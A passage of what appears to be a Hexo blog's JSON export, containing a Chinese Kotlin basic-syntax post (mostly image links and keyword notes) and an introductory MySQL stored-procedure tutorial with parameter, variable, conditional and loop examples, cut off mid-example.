Operator\n![Kotlin](Kotlin基础语法/16.png)\n#### 默认参数\n![Kotlin](Kotlin基础语法/17.png)\n#### 继承和实现\n![Kotlin](Kotlin基础语法/18.png)\n![Kotlin](Kotlin基础语法/19.png)\n![Kotlin](Kotlin基础语法/20.png)\n![Kotlin](Kotlin基础语法/21.png)\n#### object\n![Kotlin](Kotlin基础语法/22.png)\n#### 静态方法的定义\n![Kotlin](Kotlin基础语法/23.png)\n![Kotlin](Kotlin基础语法/24.png)\n\n**方法签名：**这是一个JVM概念，虚拟机根据方法签名来判断方法的唯一性，从而会存在方法的重载。方法返回值不属于方法签名\n\nlamd表达式是一种匿名函数\n\n\n\n\n\n\n\n\n","source":"_posts/Kotlin基础语法.md","raw":"---\ntitle: Kotlin基础语法\ndate: 2017-12-31 13:39:32\ntags: Kotlin\n---\n\n**前言：**\n&emsp;&emsp;上海百联大宗内部员工培训系统是为了给内部员工提供一个高素质培训平台，也是百联研发部新技术实验平台。该系统前期采用的是Vertx作为系统框架，以Kotlin作为开发语言，以Vue作为前台框架。将来还会有更多的新技术应用于该平台。作为平台的开发人员，为了满足开发的需求，所以学习了Kotlin, 现将基本语法整理出来供大家学习，同时也便于日后查看。\n#### 空类型用法：\n![Kotlin](Kotlin基础语法/1.png)\nas : 类型转换关键字/包别名 \n安全类型转换: \n智能类型转换: \n#### 区间:\n![Kotlin](Kotlin基础语法/2.png)\n#### 数组的使用方法\n![Kotlin](Kotlin基础语法/3.png)\n#### 基本数据类型的数组\n![Kotlin](Kotlin基础语法/4.png)\n#### 常量与变量\n![Kotlin](Kotlin基础语法/5.png)\n#### Lamd表达式\n![Kotlin](Kotlin基础语法/6.png)\n#### Lamd表达式参数传递\n![Kotlin](Kotlin基础语法/7.png)\n#### 成员变量和局部变量的定义和区别：\n成员变量都是用val或var修饰的，而没有被这两个关键字修饰的变量都是局部变量\n![Kotlin](Kotlin基础语法/8.png)\n#### 变量的初始化\n![Kotlin](Kotlin基础语法/9.png)\n#### 成员变量的访问控制\n![Kotlin](Kotlin基础语法/10.png)\n#### 运算符的定义\n![Kotlin](Kotlin基础语法/11.png)\n#### Kotlin关键字：\n\n**operator:**定义运算符\n**infix:**定义中缀表达式\n**override:**重写父类方法\n**constructor:**构造器\n**const:**定义编译期常量\n**val:**定义普通成员常量\n**var:**定义成员变量\n\n**注意：**\n\n1. 在Kotlin中when，if语句和Lamda表达式一样具有返回值，返回值为最后一行的值\n\n2. 在Kotlin中默认的类和方法都是final的，要继承重写必须用关键字open，或者设置成abstract类型，重写方法必须使用override关键字\n\n#### if表达式\n![Kotlin](Kotlin基础语法/12.png)\n#### when、continue 和 break\nwhen表达式，Java中switch的替代品, 循环关键字continue和break\n![Kotlin](Kotlin基础语法/13.png)\n#### 具名参数\n![Kotlin](Kotlin基础语法/14.png)\n#### 变长参数\n![Kotlin](Kotlin基础语法/15.png)\n#### Sperat Operator\n![Kotlin](Kotlin基础语法/16.png)\n#### 默认参数\n![Kotlin](Kotlin基础语法/17.png)\n#### 继承和实现\n![Kotlin](Kotlin基础语法/18.png)\n![Kotlin](Kotlin基础语法/19.png)\n![Kotlin](Kotlin基础语法/20.png)\n![Kotlin](Kotlin基础语法/21.png)\n#### object\n![Kotlin](Kotlin基础语法/22.png)\n#### 静态方法的定义\n![Kotlin](Kotlin基础语法/23.png)\n![Kotlin](Kotlin基础语法/24.png)\n\n**方法签名：**这是一个JVM概念，虚拟机根据方法签名来判断方法的唯一性，从而会存在方法的重载。方法返回值不属于方法签名\n\nlamd表达式是一种匿名函数\n\n\n\n\n\n\n\n\n","slug":"Kotlin基础语法","published":1,"updated":"2018-01-31T06:08:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw30012mfah3v1k5d0i","content":"<p><strong>前言：</strong><br>&emsp;&emsp;上海百联大宗内部员工培训系统是为了给内部员工提供一个高素质培训平台，也是百联研发部新技术实验平台。该系统前期采用的是Vertx作为系统框架，以Kotlin作为开发语言，以Vue作为前台框架。将来还会有更多的新技术应用于该平台。作为平台的开发人员，为了满足开发的需求，所以学习了Kotlin, 现将基本语法整理出来供大家学习，同时也便于日后查看。</p>\n<h4 id=\"空类型用法：\"><a href=\"#空类型用法：\" class=\"headerlink\" title=\"空类型用法：\"></a>空类型用法：</h4><p><img src=\"Kotlin基础语法/1.png\" alt=\"Kotlin\"><br>as : 类型转换关键字/包别名<br>安全类型转换:<br>智能类型转换: </p>\n<h4 id=\"区间\"><a href=\"#区间\" class=\"headerlink\" title=\"区间:\"></a>区间:</h4><p><img src=\"Kotlin基础语法/2.png\" alt=\"Kotlin\"></p>\n<h4 id=\"数组的使用方法\"><a href=\"#数组的使用方法\" class=\"headerlink\" title=\"数组的使用方法\"></a>数组的使用方法</h4><p><img src=\"Kotlin基础语法/3.png\" alt=\"Kotlin\"></p>\n<h4 id=\"基本数据类型的数组\"><a href=\"#基本数据类型的数组\" class=\"headerlink\" title=\"基本数据类型的数组\"></a>基本数据类型的数组</h4><p><img src=\"Kotlin基础语法/4.png\" alt=\"Kotlin\"></p>\n<h4 id=\"常量与变量\"><a href=\"#常量与变量\" class=\"headerlink\" title=\"常量与变量\"></a>常量与变量</h4><p><img src=\"Kotlin基础语法/5.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Lamd表达式\"><a href=\"#Lamd表达式\" class=\"headerlink\" title=\"Lamd表达式\"></a>Lamd表达式</h4><p><img src=\"Kotlin基础语法/6.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Lamd表达式参数传递\"><a href=\"#Lamd表达式参数传递\" class=\"headerlink\" title=\"Lamd表达式参数传递\"></a>Lamd表达式参数传递</h4><p><img src=\"Kotlin基础语法/7.png\" alt=\"Kotlin\"></p>\n<h4 id=\"成员变量和局部变量的定义和区别：\"><a href=\"#成员变量和局部变量的定义和区别：\" class=\"headerlink\" title=\"成员变量和局部变量的定义和区别：\"></a>成员变量和局部变量的定义和区别：</h4><p>成员变量都是用val或var修饰的，而没有被这两个关键字修饰的变量都是局部变量<br><img src=\"Kotlin基础语法/8.png\" alt=\"Kotlin\"></p>\n<h4 id=\"变量的初始化\"><a href=\"#变量的初始化\" class=\"headerlink\" title=\"变量的初始化\"></a>变量的初始化</h4><p><img src=\"Kotlin基础语法/9.png\" alt=\"Kotlin\"></p>\n<h4 id=\"成员变量的访问控制\"><a href=\"#成员变量的访问控制\" class=\"headerlink\" title=\"成员变量的访问控制\"></a>成员变量的访问控制</h4><p><img src=\"Kotlin基础语法/10.png\" alt=\"Kotlin\"></p>\n<h4 id=\"运算符的定义\"><a href=\"#运算符的定义\" class=\"headerlink\" title=\"运算符的定义\"></a>运算符的定义</h4><p><img src=\"Kotlin基础语法/11.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Kotlin关键字：\"><a href=\"#Kotlin关键字：\" class=\"headerlink\" title=\"Kotlin关键字：\"></a>Kotlin关键字：</h4><p><strong>operator:</strong>定义运算符<br><strong>infix:</strong>定义中缀表达式<br><strong>override:</strong>重写父类方法<br><strong>constructor:</strong>构造器<br><strong>const:</strong>定义编译期常量<br><strong>val:</strong>定义普通成员常量<br><strong>var:</strong>定义成员变量</p>\n<p><strong>注意：</strong></p>\n<ol>\n<li><p>在Kotlin中when，if语句和Lamda表达式一样具有返回值，返回值为最后一行的值</p>\n</li>\n<li><p>在Kotlin中默认的类和方法都是final的，要继承重写必须用关键字open，或者设置成abstract类型，重写方法必须使用override关键字</p>\n</li>\n</ol>\n<h4 id=\"if表达式\"><a href=\"#if表达式\" class=\"headerlink\" title=\"if表达式\"></a>if表达式</h4><p><img src=\"Kotlin基础语法/12.png\" alt=\"Kotlin\"></p>\n<h4 id=\"when、continue-和-break\"><a href=\"#when、continue-和-break\" class=\"headerlink\" title=\"when、continue 和 break\"></a>when、continue 和 break</h4><p>when表达式，Java中switch的替代品, 循环关键字continue和break<br><img src=\"Kotlin基础语法/13.png\" alt=\"Kotlin\"></p>\n<h4 id=\"具名参数\"><a href=\"#具名参数\" class=\"headerlink\" title=\"具名参数\"></a>具名参数</h4><p><img src=\"Kotlin基础语法/14.png\" alt=\"Kotlin\"></p>\n<h4 id=\"变长参数\"><a href=\"#变长参数\" class=\"headerlink\" title=\"变长参数\"></a>变长参数</h4><p><img src=\"Kotlin基础语法/15.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Sperat-Operator\"><a href=\"#Sperat-Operator\" class=\"headerlink\" title=\"Sperat Operator\"></a>Sperat Operator</h4><p><img src=\"Kotlin基础语法/16.png\" alt=\"Kotlin\"></p>\n<h4 id=\"默认参数\"><a href=\"#默认参数\" class=\"headerlink\" title=\"默认参数\"></a>默认参数</h4><p><img src=\"Kotlin基础语法/17.png\" alt=\"Kotlin\"></p>\n<h4 id=\"继承和实现\"><a href=\"#继承和实现\" class=\"headerlink\" title=\"继承和实现\"></a>继承和实现</h4><p><img src=\"Kotlin基础语法/18.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/19.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/20.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/21.png\" alt=\"Kotlin\"></p>\n<h4 id=\"object\"><a href=\"#object\" class=\"headerlink\" title=\"object\"></a>object</h4><p><img src=\"Kotlin基础语法/22.png\" alt=\"Kotlin\"></p>\n<h4 id=\"静态方法的定义\"><a href=\"#静态方法的定义\" class=\"headerlink\" title=\"静态方法的定义\"></a>静态方法的定义</h4><p><img src=\"Kotlin基础语法/23.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/24.png\" alt=\"Kotlin\"></p>\n<p><strong>方法签名：</strong>这是一个JVM概念，虚拟机根据方法签名来判断方法的唯一性，从而会存在方法的重载。方法返回值不属于方法签名</p>\n<p>lamd表达式是一种匿名函数</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>前言：</strong><br>&emsp;&emsp;上海百联大宗内部员工培训系统是为了给内部员工提供一个高素质培训平台，也是百联研发部新技术实验平台。该系统前期采用的是Vertx作为系统框架，以Kotlin作为开发语言，以Vue作为前台框架。将来还会有更多的新技术应用于该平台。作为平台的开发人员，为了满足开发的需求，所以学习了Kotlin, 现将基本语法整理出来供大家学习，同时也便于日后查看。</p>\n<h4 id=\"空类型用法：\"><a href=\"#空类型用法：\" class=\"headerlink\" title=\"空类型用法：\"></a>空类型用法：</h4><p><img src=\"Kotlin基础语法/1.png\" alt=\"Kotlin\"><br>as : 类型转换关键字/包别名<br>安全类型转换:<br>智能类型转换: </p>\n<h4 id=\"区间\"><a href=\"#区间\" class=\"headerlink\" title=\"区间:\"></a>区间:</h4><p><img src=\"Kotlin基础语法/2.png\" alt=\"Kotlin\"></p>\n<h4 id=\"数组的使用方法\"><a href=\"#数组的使用方法\" class=\"headerlink\" title=\"数组的使用方法\"></a>数组的使用方法</h4><p><img src=\"Kotlin基础语法/3.png\" alt=\"Kotlin\"></p>\n<h4 id=\"基本数据类型的数组\"><a href=\"#基本数据类型的数组\" class=\"headerlink\" title=\"基本数据类型的数组\"></a>基本数据类型的数组</h4><p><img src=\"Kotlin基础语法/4.png\" alt=\"Kotlin\"></p>\n<h4 id=\"常量与变量\"><a href=\"#常量与变量\" class=\"headerlink\" title=\"常量与变量\"></a>常量与变量</h4><p><img src=\"Kotlin基础语法/5.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Lamd表达式\"><a href=\"#Lamd表达式\" class=\"headerlink\" title=\"Lamd表达式\"></a>Lamd表达式</h4><p><img src=\"Kotlin基础语法/6.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Lamd表达式参数传递\"><a href=\"#Lamd表达式参数传递\" class=\"headerlink\" title=\"Lamd表达式参数传递\"></a>Lamd表达式参数传递</h4><p><img src=\"Kotlin基础语法/7.png\" alt=\"Kotlin\"></p>\n<h4 id=\"成员变量和局部变量的定义和区别：\"><a href=\"#成员变量和局部变量的定义和区别：\" class=\"headerlink\" title=\"成员变量和局部变量的定义和区别：\"></a>成员变量和局部变量的定义和区别：</h4><p>成员变量都是用val或var修饰的，而没有被这两个关键字修饰的变量都是局部变量<br><img src=\"Kotlin基础语法/8.png\" alt=\"Kotlin\"></p>\n<h4 id=\"变量的初始化\"><a href=\"#变量的初始化\" class=\"headerlink\" title=\"变量的初始化\"></a>变量的初始化</h4><p><img src=\"Kotlin基础语法/9.png\" alt=\"Kotlin\"></p>\n<h4 id=\"成员变量的访问控制\"><a href=\"#成员变量的访问控制\" class=\"headerlink\" title=\"成员变量的访问控制\"></a>成员变量的访问控制</h4><p><img src=\"Kotlin基础语法/10.png\" alt=\"Kotlin\"></p>\n<h4 id=\"运算符的定义\"><a href=\"#运算符的定义\" class=\"headerlink\" title=\"运算符的定义\"></a>运算符的定义</h4><p><img src=\"Kotlin基础语法/11.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Kotlin关键字：\"><a href=\"#Kotlin关键字：\" class=\"headerlink\" title=\"Kotlin关键字：\"></a>Kotlin关键字：</h4><p><strong>operator:</strong>定义运算符<br><strong>infix:</strong>定义中缀表达式<br><strong>override:</strong>重写父类方法<br><strong>constructor:</strong>构造器<br><strong>const:</strong>定义编译期常量<br><strong>val:</strong>定义普通成员常量<br><strong>var:</strong>定义成员变量</p>\n<p><strong>注意：</strong></p>\n<ol>\n<li><p>在Kotlin中when，if语句和Lamda表达式一样具有返回值，返回值为最后一行的值</p>\n</li>\n<li><p>在Kotlin中默认的类和方法都是final的，要继承重写必须用关键字open，或者设置成abstract类型，重写方法必须使用override关键字</p>\n</li>\n</ol>\n<h4 id=\"if表达式\"><a href=\"#if表达式\" class=\"headerlink\" title=\"if表达式\"></a>if表达式</h4><p><img src=\"Kotlin基础语法/12.png\" alt=\"Kotlin\"></p>\n<h4 id=\"when、continue-和-break\"><a href=\"#when、continue-和-break\" class=\"headerlink\" title=\"when、continue 和 break\"></a>when、continue 和 break</h4><p>when表达式，Java中switch的替代品, 循环关键字continue和break<br><img src=\"Kotlin基础语法/13.png\" alt=\"Kotlin\"></p>\n<h4 id=\"具名参数\"><a href=\"#具名参数\" class=\"headerlink\" title=\"具名参数\"></a>具名参数</h4><p><img src=\"Kotlin基础语法/14.png\" alt=\"Kotlin\"></p>\n<h4 id=\"变长参数\"><a href=\"#变长参数\" class=\"headerlink\" title=\"变长参数\"></a>变长参数</h4><p><img src=\"Kotlin基础语法/15.png\" alt=\"Kotlin\"></p>\n<h4 id=\"Sperat-Operator\"><a href=\"#Sperat-Operator\" class=\"headerlink\" title=\"Sperat Operator\"></a>Sperat Operator</h4><p><img src=\"Kotlin基础语法/16.png\" alt=\"Kotlin\"></p>\n<h4 id=\"默认参数\"><a href=\"#默认参数\" class=\"headerlink\" title=\"默认参数\"></a>默认参数</h4><p><img src=\"Kotlin基础语法/17.png\" alt=\"Kotlin\"></p>\n<h4 id=\"继承和实现\"><a href=\"#继承和实现\" class=\"headerlink\" title=\"继承和实现\"></a>继承和实现</h4><p><img src=\"Kotlin基础语法/18.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/19.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/20.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/21.png\" alt=\"Kotlin\"></p>\n<h4 id=\"object\"><a href=\"#object\" class=\"headerlink\" title=\"object\"></a>object</h4><p><img src=\"Kotlin基础语法/22.png\" alt=\"Kotlin\"></p>\n<h4 id=\"静态方法的定义\"><a href=\"#静态方法的定义\" class=\"headerlink\" title=\"静态方法的定义\"></a>静态方法的定义</h4><p><img src=\"Kotlin基础语法/23.png\" alt=\"Kotlin\"><br><img src=\"Kotlin基础语法/24.png\" alt=\"Kotlin\"></p>\n<p><strong>方法签名：</strong>这是一个JVM概念，虚拟机根据方法签名来判断方法的唯一性，从而会存在方法的重载。方法返回值不属于方法签名</p>\n<p>lamd表达式是一种匿名函数</p>\n"},{"title":"MySQL存储过程入门教程","date":"2017-09-08T01:06:21.000Z","_content":"[TOC]\n\n#### 什么是存储过程？\n存储过程是存储在MySQL数据库中的已经经过编译好的SQL指令集。\n\n#### 存储过程的特点：\n\n- 因此执行时不需要数据库进行编译、优化就可以直接运行，相比直接执行SQL语句而言省去了编译和优化的环节，从而节省了系统的消耗。\n- 触发器是在对数据库中数据进行增删改的时候触发执行的，是一个自动的过程。\n- 存储过程能将对多个表的复杂操作封装到一起，结合MySQL事务进行执行。如果用程序来执行，那就变成了多次执行单条SQL语句，执行\n- 过程中不仅每次需要数据库进行编译、优化，而且需要多次连接数据库，十分消耗性能。\n- 存储过程能对数据库的访问权限进行细化。\n#### 什么情况下应该使用存储过程？\n\n- 存储过程的使用要根据项目实际情况来决定。并非将所有的业务逻辑都封装成存储过程就好。因为存储过程的移植性差，不同的数据库对于存储过程的实现语法都存在差异。\n- 不要将大量的运算放在存储过程中去，因为高并发下，多个用户访问，数据库的运算量会激增，导致数据库压力过大，不如将所有的计算放在web端。\n- 针对并发量大的web项目，不建议大量使用存储过程，原因如上。如果要是用，请控制存储过程的复杂程度，逻辑越简单越好。\n\n#### 定义一个存储过程\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS countRow;\n\tCREATE PROCEDURE countRow(OUT num INT)\n\t    BEGIN\n\t      SELECT COUNT(*) INTO num FROM mysql.user;\n\t    END $$\n\n\tDELIMITER ;\n\t-- 调用存储过程\n\tCALL countRow(@s);\n\tSELECT @s as num;\n\n#### 存储过程参数：IN 参数\n\n\t-- IN 类型的参数表示在调用的时候需要传入实际值，该值的作用域仅限于存储过程内部，不会对外输出该值\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramIn;\n\tCREATE PROCEDURE paramIn(IN p_in INT)\n\t    BEGIN\n\t      SELECT p_in AS init_val;\n\t      SET p_in = 100;\n\t      SELECT p_in AS update_val;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_in = 11;\n\t-- 查询变量的初始值\n\tSELECT @p_in;\n\t-- 调用存储过程\n\tCALL paramIn(@p_in);\n\t-- 在此查看用户变量的值是否仍为11\n\tSELECT @p_in;\n\n\n#### 存储过程参数：OUT 参数\n\n\t-- OUT 类型的参数表示在调用的时候不能传入外部值，该值由存储过程在内部赋值之后返回给外部，可以在外部访问\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramOut;\n\tCREATE PROCEDURE paramOut(OUT p_out INT)\n\t    BEGIN\n\t\tSELECT p_out AS init_val;\n\t#         SET p_out = 200;\n\t#         SELECT p_out AS update_val;\n\t    END $$\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_out = 22;\n\t-- 查询变量的初始值\n\tSELECT @p_out;\n\t-- 调用存储过程\n\tCALL paramOut(@p_out);\n\t-- 在此查看用户变量的值是否已经变成200\n\tSELECT @p_out;\n\n\n#### 存储过程参数：INOUT 参数\n\n\t-- NOUT 类型的参数表示在调用存储过程的时候可以接收外部传入的参数值，执行完后也能将新值传出\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramInout;\n\tCREATE PROCEDURE paramInout(INOUT p_inout INT)\n\t    BEGIN\n\t      SELECT p_inout AS init_val;\n\t      SET p_inout = 300;\n\t      SELECT p_inout AS update_val;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_inout = 33;\n\t-- 查询变量的初始值\n\tSELECT @p_inout;\n\t-- 调用存储过程\n\tCALL paramInout(@p_inout);\n\t-- 在此查看用户变量的值是否已经变成200\n\tSELECT @p_inout;\n\n\n#### 存储过程参数：不指定参数类型\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramDefault;\n\tCREATE PROCEDURE paramDefault(p_default INT)\n\t    BEGIN\n\t\tSELECT p_default AS init_val;\n\t\tSET p_default = 400;\n\t\tSELECT p_default AS update_val;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_default = 44;\n\t-- 查询变量的初始值\n\tSELECT @p_default;\n\t-- 调用存储过程\n\tCALL paramDefault(@p_default);\n\t-- 在此查看用户变量的值是否仍是44\n\tSELECT @p_default;\n\n#### 总结：\n以存储过程为中心，IN 表示能将值传入到存储过程中，但是不能传出去； OUT 表示不能将值传入到存储过程中，但是能将值传出到外部；INOUT 表示能将值传入到存储过程中，执行完成后也能将值传出到外部；如果不指定参数类型，默认为 IN。\n\n\n#### 存储过程中变量的定义：使用 DECLARE 关键字\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS variableDefine;\n\tCREATE PROCEDURE variableDefine()\n\t    BEGIN\n\t\t-- 定义变量的格式：DECLARE 变量名 数据类型 （默认值可选）\n\t\tDECLARE variableName VARCHAR(20) DEFAULT \"defaultName\";\n\n\t\t-- 变量赋值格式：SET 变量名 = 变量值\n\t\tSET variableName = \"signedValue\";\n\n\t\tSELECT CONCAT(\"the new value is:\", variableName) AS name;\n\t    END $$\n\n\tDELIMITER ;\n\n\tCALL variableDefine();\n\n#### 存储过程中的变量作用域：详见IN、 OUT、 INOUT\n\n#### 存储过程中的条件语句：IF -- ELSEIF -- ELSE -- END IF\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS conditional1;\n\tCREATE PROCEDURE conditional1(IN input INT)\n\t    BEGIN\n\t\tIF input BETWEEN 0 AND 60 THEN\n\t\t    SELECT \"L\" AS GRADE;\n\t\tELSEIF input BETWEEN 60 AND 80 THEN\n\t\t    SELECT \"M\" AS GRADE;\n\t\tELSEIF input BETWEEN 80 AND 100 THEN\n\t\t    SELECT \"H\" AS GRADE;\n\t\tELSE\n\t\t    SELECT \"Error\" AS Warning;\n\t\tEND IF;\n\t    END $$\n\tDELIMITER ;\n\n\tSET @input = 90;\n\tCALL conditional(@input);\n\n#### 存储过程中的条件语句：CASE -- WHEN THEN\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS conditional2;\n\tCREATE PROCEDURE conditional2(IN case_val INT)\n\t    BEGIN\n\t\tCASE case_val\n\t\t    WHEN 20 THEN\n\t\t        SELECT \"L\" AS GRADE;\n\t\t    WHEN 30 THEN\n\t\t        SELECT \"M\" AS GRADE;\n\t\t    WHEN 40 THEN\n\t\t        SELECT \"H\" AS GRADE;\n\t\t    ELSE\n\t\t        SELECT \"ERROR\" AS Warning;\n\t\tEND CASE ;\n\t    END $$\n\n\tDELIMITER ;\n\n\tSET @case_val = 30;\n\tCALL conditional2(@case_val);\n\n#### 存储过程中的循环语句(先判断后执行)：WHILE DO -- END WHILE\n\t\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS loop1;\n\tCREATE PROCEDURE loop1(IN loop_val INT)\n\t    BEGIN\n\t\tWHILE loop_val > 10 DO\n\t\t    -- doing something\n\t\tEND WHILE;\n\t    END $$\n\tDELIMITER ;\n\n#### 存储过程中的循环语句(先执行后判断)：REPEAT -- UNTIL -- END REPEAT\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS loop1;\n\tCREATE PROCEDURE loop1(IN loop_val INT)\n\t    BEGIN\n\t\tREPEAT\n\t\t    -- doing something\n\t\t    UNTIL  loop_val > 10\n\t\tEND REPEAT;\n\t    END $$\n\tDELIMITER ;\n\n\n#### 存储过程中的循环语句：LOOP -- LEAVE -- END LOOP\n\t\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS loop1;\n\tCREATE PROCEDURE loop1(IN loop_val INT)\n\t    BEGIN\n\t\tlabel:LOOP\n\t\t    if loop_val > 10 THEN\n\t\t        -- 跳出循环\n\t\t        LEAVE label;\n\t\t    ELSEIF loop_val > 20 THEN\n\t\t        -- 跳出本次循环执行下一次循环\n\t\t        ITERATE label;\n\t\t    END IF;\n\t\tEND LOOP;\n\t    END $$\n\tDELIMITER ;\n\n#### 查看存储过程的状态：\n\n\tSHOW PROCEDURE STATUS LIKE 'conditional1';\n\n\tSHOW PROCEDURE STATUS LIKE 'conditional%';\n#### 查看存储过程定义相关信息\n\n\tSHOW CREATE PROCEDURE conditional1;\n\n#### 修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\n\n\tALTER PROCEDURE conditional1 SQL SECURITY DEFINER ; -- 修改存储过程的调用者（INVOKER \\ DEFINER）\n\n#### 删除存储过程\n\n\tDROP PROCEDURE conditional1;","source":"_posts/MySQL存储过程入门教程.md","raw":"---\ntitle: MySQL存储过程入门教程\ndate: 2017-09-08 09:06:21\ntags: MySql\n---\n[TOC]\n\n#### 什么是存储过程？\n存储过程是存储在MySQL数据库中的已经经过编译好的SQL指令集。\n\n#### 存储过程的特点：\n\n- 因此执行时不需要数据库进行编译、优化就可以直接运行，相比直接执行SQL语句而言省去了编译和优化的环节，从而节省了系统的消耗。\n- 触发器是在对数据库中数据进行增删改的时候触发执行的，是一个自动的过程。\n- 存储过程能将对多个表的复杂操作封装到一起，结合MySQL事务进行执行。如果用程序来执行，那就变成了多次执行单条SQL语句，执行\n- 过程中不仅每次需要数据库进行编译、优化，而且需要多次连接数据库，十分消耗性能。\n- 存储过程能对数据库的访问权限进行细化。\n#### 什么情况下应该使用存储过程？\n\n- 存储过程的使用要根据项目实际情况来决定。并非将所有的业务逻辑都封装成存储过程就好。因为存储过程的移植性差，不同的数据库对于存储过程的实现语法都存在差异。\n- 不要将大量的运算放在存储过程中去，因为高并发下，多个用户访问，数据库的运算量会激增，导致数据库压力过大，不如将所有的计算放在web端。\n- 针对并发量大的web项目，不建议大量使用存储过程，原因如上。如果要是用，请控制存储过程的复杂程度，逻辑越简单越好。\n\n#### 定义一个存储过程\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS countRow;\n\tCREATE PROCEDURE countRow(OUT num INT)\n\t    BEGIN\n\t      SELECT COUNT(*) INTO num FROM mysql.user;\n\t    END $$\n\n\tDELIMITER ;\n\t-- 调用存储过程\n\tCALL countRow(@s);\n\tSELECT @s as num;\n\n#### 存储过程参数：IN 参数\n\n\t-- IN 类型的参数表示在调用的时候需要传入实际值，该值的作用域仅限于存储过程内部，不会对外输出该值\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramIn;\n\tCREATE PROCEDURE paramIn(IN p_in INT)\n\t    BEGIN\n\t      SELECT p_in AS init_val;\n\t      SET p_in = 100;\n\t      SELECT p_in AS update_val;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_in = 11;\n\t-- 查询变量的初始值\n\tSELECT @p_in;\n\t-- 调用存储过程\n\tCALL paramIn(@p_in);\n\t-- 在此查看用户变量的值是否仍为11\n\tSELECT @p_in;\n\n\n#### 存储过程参数：OUT 参数\n\n\t-- OUT 类型的参数表示在调用的时候不能传入外部值，该值由存储过程在内部赋值之后返回给外部，可以在外部访问\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramOut;\n\tCREATE PROCEDURE paramOut(OUT p_out INT)\n\t    BEGIN\n\t\tSELECT p_out AS init_val;\n\t#         SET p_out = 200;\n\t#         SELECT p_out AS update_val;\n\t    END $$\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_out = 22;\n\t-- 查询变量的初始值\n\tSELECT @p_out;\n\t-- 调用存储过程\n\tCALL paramOut(@p_out);\n\t-- 在此查看用户变量的值是否已经变成200\n\tSELECT @p_out;\n\n\n#### 存储过程参数：INOUT 参数\n\n\t-- NOUT 类型的参数表示在调用存储过程的时候可以接收外部传入的参数值，执行完后也能将新值传出\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramInout;\n\tCREATE PROCEDURE paramInout(INOUT p_inout INT)\n\t    BEGIN\n\t      SELECT p_inout AS init_val;\n\t      SET p_inout = 300;\n\t      SELECT p_inout AS update_val;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_inout = 33;\n\t-- 查询变量的初始值\n\tSELECT @p_inout;\n\t-- 调用存储过程\n\tCALL paramInout(@p_inout);\n\t-- 在此查看用户变量的值是否已经变成200\n\tSELECT @p_inout;\n\n\n#### 存储过程参数：不指定参数类型\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS paramDefault;\n\tCREATE PROCEDURE paramDefault(p_default INT)\n\t    BEGIN\n\t\tSELECT p_default AS init_val;\n\t\tSET p_default = 400;\n\t\tSELECT p_default AS update_val;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 定义一个用户变量\n\tSET @p_default = 44;\n\t-- 查询变量的初始值\n\tSELECT @p_default;\n\t-- 调用存储过程\n\tCALL paramDefault(@p_default);\n\t-- 在此查看用户变量的值是否仍是44\n\tSELECT @p_default;\n\n#### 总结：\n以存储过程为中心，IN 表示能将值传入到存储过程中，但是不能传出去； OUT 表示不能将值传入到存储过程中，但是能将值传出到外部；INOUT 表示能将值传入到存储过程中，执行完成后也能将值传出到外部；如果不指定参数类型，默认为 IN。\n\n\n#### 存储过程中变量的定义：使用 DECLARE 关键字\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS variableDefine;\n\tCREATE PROCEDURE variableDefine()\n\t    BEGIN\n\t\t-- 定义变量的格式：DECLARE 变量名 数据类型 （默认值可选）\n\t\tDECLARE variableName VARCHAR(20) DEFAULT \"defaultName\";\n\n\t\t-- 变量赋值格式：SET 变量名 = 变量值\n\t\tSET variableName = \"signedValue\";\n\n\t\tSELECT CONCAT(\"the new value is:\", variableName) AS name;\n\t    END $$\n\n\tDELIMITER ;\n\n\tCALL variableDefine();\n\n#### 存储过程中的变量作用域：详见IN、 OUT、 INOUT\n\n#### 存储过程中的条件语句：IF -- ELSEIF -- ELSE -- END IF\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS conditional1;\n\tCREATE PROCEDURE conditional1(IN input INT)\n\t    